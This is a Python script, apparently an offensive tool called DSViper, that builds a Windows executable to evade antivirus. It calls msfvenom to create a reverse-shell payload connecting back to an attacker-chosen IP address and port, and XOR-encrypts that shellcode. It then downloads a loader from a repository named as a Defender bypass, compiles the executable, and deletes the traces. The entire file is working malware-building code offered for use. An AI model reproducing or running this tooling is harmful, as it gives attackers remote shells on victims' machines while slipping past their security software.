#!/usr/bin/python3 
import os
import argparse
import sys
import random
from os import urandom
import requests
import subprocess


def xorEncrypt(plaintext, key):
    print("\n")
    
    ciphertext = bytearray()
    for i in range(len(plaintext)):
        # XOR each byte with the key in a repeating pattern
        ciphertext.append(plaintext[i] ^ key[i % len(key)])
    
    #print("Ciphertext after XOR encryption:", ciphertext)
    return bytes(ciphertext)
'''
if len(sys.argv)!=3:
   print("usage: python3 exploit.py <ip address> <port>")
   sys.exit(1)
'''
RED = "\33[91m"
banner = f"""
{RED}

░▒▓███████▓▒░ ░▒▓███████▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░              ░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░        ░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░        ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░        ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓███████▓▒░░▒▓███████▓▒░          ░▒▓██▓▒░  ░▒▓█▓▒░▒▓█▓▒░      ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
                                                                                             
                                                                                                
    """
print(banner)

ipadd = input("IP Address: ")
port = input("Port: ")

msfvenom_command = f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ipadd} LPORT={port} -f raw > payload.bin"

subprocess.run(msfvenom_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

with open("payload.bin", "rb") as file:
        content = file.read()
key = [random.randint(0, 255) for _ in range(16)]
ciphertext = xorEncrypt(content, key)


'''
#XORkey = { 0x' + ', 0x'.join(hex(x)[2:] for x in key) + ' };')
#XORshellcode = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')
#XORkey = ', '.join(f'0x{x:02x}' for x in key)
#XORshellcode = ', '.join(f'0x{x:02x}' for x in ciphertext)
#print(XORkey)
#print("\n")
#print(XORshellcode)
#print("\n")
'''
XOR_key = bytes(key)
with open("XORkey.bin", "wb") as f:
    f.write(XOR_key)

# Save XORcode.bin
XOR_code = bytes(ciphertext)
    # ... (add all remaining bytes)
with open("XORcode.bin", "wb") as f:
    f.write(XOR_code)
    


with open("resources.rc", "wb") as f:
    f.write('AESCODE   RCDATA   "XORcode.bin"\n'.encode('utf-8'))
    f.write('AESKEY    RCDATA   "XORkey.bin"\n'.encode('utf-8'))
    
    
    
url= "https://raw.githubusercontent.com/dagowda/XOR_resource_defender_bypass_2025/refs/heads/main/XORbypass.cpp"

try:
   res=requests.get(url)
   with open("XORbypass.cpp", "wb") as f:
       f.write(res.content)
except requests.RequestException as e:
   print("the error is {e}")
   exit(1)
   
try:
  subprocess.run(["x86_64-w64-mingw32-windres", "resources.rc", "-O", "coff", "-o", "resources.res"],check=True)
  #print("Resource Compiled Successfully")
  subprocess.run(["x86_64-w64-mingw32-g++",
            "--static",
            "-o",
            "DSViper.exe",
            "XORbypass.cpp",
            "resources.res",
            "-fpermissive",
            "-lws2_32" ],
            check=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)#to make sure that the compilations errors are not shown
  print("Malicious payload successfully created as DSViper.exe")
except subprocess.CalledProcessError as e:
    print("there is an error {e}")
    
files=["payload.bin","XORcode.bin","XORkey.bin","resources.res","resources.rc","XORbypass.cpp"]
for file in files:
   os.remove(file)
print("\n")
#printf("clean up is done")
